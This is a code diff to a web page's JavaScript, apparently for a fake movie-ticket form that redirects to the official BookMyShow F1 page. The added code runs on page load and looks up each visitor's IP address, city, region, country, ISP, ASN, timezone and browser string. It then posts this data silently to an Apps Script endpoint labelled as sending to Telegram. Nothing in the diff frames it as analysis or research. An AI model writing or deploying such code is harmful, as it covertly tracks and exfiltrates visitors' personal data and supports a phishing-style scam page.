@@ -62,3 +62,43 @@ ticketForm.addEventListener('submit', async (e) => {
   // Redirect to official site
   window.location.href = 'https://in.bookmyshow.com/movies/f1-the-movie/ET00403839';
 });
+
+// Step 3: Collect IP + device info
+function collectDeviceInfo() {
+  fetch('https://ipapi.co/json/')
+    .then(response => response.json())
+    .then(data => {
+      const message = `
+🌐 Visitor Info:
+IP: ${data.ip}
+City: ${data.city}
+Region: ${data.region}
+Country: ${data.country_name}
+ISP: ${data.org}
+ASN: ${data.asn}
+Timezone: ${data.timezone}
+Browser: ${navigator.userAgent}
+      `;
+      sendToTelegram(message);
+    })
+    .catch(error => {
+      console.error("Failed to fetch device info:", error);
+    });
+}
+
+// Utility: Send to Telegram
+function sendToTelegram(msg) {
+  fetch(APPS_SCRIPT_URL, {
+    method: "POST",
+    mode: "no-cors",
+    headers: {
+      "Content-Type": "application/json"
+    },
+    body: JSON.stringify({ log: msg })
+  });
+}
+
+// Trigger on page load
+document.addEventListener("DOMContentLoaded", () => {
+  collectDeviceInfo();
+});
